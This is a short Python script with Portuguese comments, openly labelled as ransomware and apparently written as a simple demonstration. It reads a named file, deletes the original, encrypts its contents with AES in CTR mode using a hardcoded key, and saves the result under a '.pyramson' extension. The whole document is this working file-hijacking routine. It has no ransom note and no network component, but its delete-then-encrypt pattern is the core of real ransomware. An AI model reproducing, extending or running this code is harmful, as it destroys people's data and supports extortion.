#RAMSOWARE

#AO EXECUTA ESTE CÓDIGO IRÁ SER FEITO O SEQUESTRO DO ARQUIVO, CRIPTOGRAFIA + MAIS EXCLUSÃO DO ORIGINAL

#SEQUESTRO DO ARQUIVO

#importar bibliotecas necessárias
import os
import pyaes

#Antes cria-se arquivo qualquer ou utiliza um ja existente.
file_name = 'doc.txt' #nomeia o arquivo utilizado
file = open(file_name, 'rb') #realiza a abertura do arquivo
file_data = file.read() #realiza a leitura do arquivo
file.close()

#remove o arquivo original
os.remove(file_name)

#define a chave que sera utilizada para criptografar o arquivo
key = b'ksjaiwyebc182756'
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data) #realizar a criptografia do arquivo

new_file_name = file_name + '.pyramson' #atribui extensao pyramson para o arquivo criptografado
new_File = open(new_file_name, 'wb') #cria o arquivo criptografado
new_File.write(crypto_data)
new_File.close()